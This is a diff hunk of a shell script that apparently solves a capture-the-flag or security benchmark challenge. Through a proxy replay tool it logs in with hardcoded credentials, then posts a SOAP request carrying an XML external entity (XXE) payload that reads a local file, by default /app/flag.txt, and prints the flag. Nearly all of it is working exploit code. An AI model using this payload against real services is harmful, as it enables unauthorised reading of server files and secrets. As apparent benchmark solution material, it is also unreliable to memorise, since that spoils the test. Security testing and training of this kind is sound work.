@@ -8,9 +8,9 @@ FILE="${2:-file:///app/flag.txt}"
 SESSION="xben032p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
 proxy_start "$URL/"; go "$URL/login"; BASE="$(req_of GET login)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
 body='<?xml version="1.0"?>'"<!DOCTYPE r [<!ENTITY xxe SYSTEM \"$FILE\">]>"'<GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'
-"$H5I" websec replay "$BASE" --create --session "$SESSION" \
+"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
   --set 'method=POST' --set 'path=/login' --set 'form.username=john' --set 'form.password=password123' >/dev/null
-"$H5I" websec replay "$BASE" --create --session "$SESSION" \
+"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
   --set 'method=POST' --set 'path=/soap_service' \
   --set 'header.Content-Type=application/xml' --set "body.raw=$body" >/dev/null
 print_flag
